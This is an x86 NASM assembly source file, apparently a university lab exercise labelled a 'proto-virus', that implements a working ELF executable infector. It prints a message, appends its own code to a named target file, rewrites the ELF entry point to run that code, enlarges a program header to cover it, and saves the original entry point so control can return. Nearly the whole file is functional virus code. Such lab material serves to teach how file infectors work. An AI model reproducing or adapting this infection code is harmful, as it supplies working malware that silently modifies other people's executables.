macros:
	%macro	syscall1 2
		mov	ebx, %2
		mov	eax, %1
		int	0x80
	%endmacro

	%macro	syscall3 4
		mov	edx, %4
		mov	ecx, %3
		mov	ebx, %2
		mov	eax, %1
		int	0x80
	%endmacro

	%macro  exit 1
		syscall1 1, %1
	%endmacro

	%macro  write 3
		syscall3 4, %1, %2, %3
	%endmacro

	%macro  read 3
		syscall3 3, %1, %2, %3
	%endmacro

	%macro  open 3
		syscall3 5, %1, %2, %3
	%endmacro

	%macro  lseek 3
		syscall3 19, %1, %2, %3
	%endmacro

	%macro  close 1
		syscall1 6, %1
	%endmacro
defines:
	%define	STK_RES	200
	%define	RDWR	2
	%define	SEEK_END 2
	%define SEEK_SET 0

	%define ENTRY		24
	%define PHDR_start	28
	%define	PHDR_size	32
	%define PHDR_memsize	20
	%define PHDR_filesize	16
	%define	PHDR_offset	4
	%define	PHDR_vaddr	8
	%define entry_ptr 0x08048000

	global _start

	section .text

_start:
	push ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage

; You code for this lab goes here
printVirus:
	call get_my_loc
	sub ecx, next_i-OutStr
	write 1, ecx, 31

main:
	mov eax, FileName
	open eax, RDWR, 777
	cmp eax, 0
	jl Error
	mov [ebp-4], eax ; ebp-4 => file descriptor

append:
	lseek [ebp-4], 0, SEEK_END
	mov [ebp-8], eax ; ebp-8 => file size
	mov eax, virus_end
	call get_my_loc
	sub ecx, next_i-_start
	sub eax, ecx ; virus size
	mov [ebp-68], eax
	write [ebp-4], ecx, eax
	mov ebx, [ebp-8] ; file size
	add eax, ebx ; file+virus
	mov [ebp - 70], eax

;elf header size = 52
;ebp-4 = fd
;ebp-8 = filesize
;ebp-60 = elf header
;ebp-64 = original entry
;ebp-68 = virus size
;ebp-70 = file+virus size
;ebp-102 = 2nd program header

changeEntry:
	lseek [ebp-4], 0, SEEK_SET
	mov eax, ebp
	sub eax, 60 ; place in stack for 52 byte header -60
	read [ebp-4], eax, 52 ; write to memory elfhdr
	mov ebx, [ebp - 60 + ENTRY] ; original entry
	mov dword [ebp - 64], ebx ; place for our original entry
	mov eax, [ebp - 60 + PHDR_start] ; phdr offset
	add eax, PHDR_size ; second phdr
	lseek [ebp-4], 0, SEEK_SET ; rewind
	lseek [ebp-4], eax, SEEK_SET ; file second phdr
	mov eax, ebp
	sub eax, 102 ; memory phdr
	read [ebp - 4], eax, PHDR_size ; read phdr to memory
	mov eax, [ebp - 102 + PHDR_vaddr]
	sub eax, [ebp - 102 + PHDR_offset] ; second program entry = vaddr - offset
	add eax, [ebp-8] ; entry point + file size = virus
	mov dword [ebp - 60 + ENTRY], eax ; change entry
	lseek [ebp-4], 0, SEEK_SET ; start of file
	mov ebx, ebp
	sub ebx, 60
	write [ebp-4], ebx, 52 ; copy new elf header

writePreviousEntry:
	lseek [ebp-4], -4, SEEK_END ; end of file -4
	mov ebx, ebp
	sub ebx, 64
	write [ebp-4], ebx, 4 ; change original entry variable
	mov eax, [ebp-70] ; file+virus
	sub eax, [ebp - 102 + PHDR_offset]  ;file+virus-offset
	mov [ebp - 102 + PHDR_memsize], eax
	mov [ebp - 102 + PHDR_filesize], eax
	mov eax, [ebp - 60 + PHDR_start] ; phdr offset
	add eax, PHDR_size ; 2nd phdr offset
	lseek [ebp-4], 0, SEEK_SET
	lseek [ebp-4], eax, SEEK_SET ; 2nd phdr in file
	mov eax, ebp
	sub eax, 102
	write [ebp-4], eax, PHDR_size
	close [ebp-4]

VirusExit:
	   exit 0       ; Termination if all is OK and no previous code to jump to
					; (also an example for use of above macros)

Error:
		call get_my_loc
		add ecx, originalEntry-next_i
		jmp [ecx]

FileName:			db "ELFexec2long", 0
OutStr:				db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        	db "perhaps not", 10 , 0

get_my_loc:
		call next_i
next_i:
		pop ecx
		ret


originalEntry: dd VirusExit

virus_end:
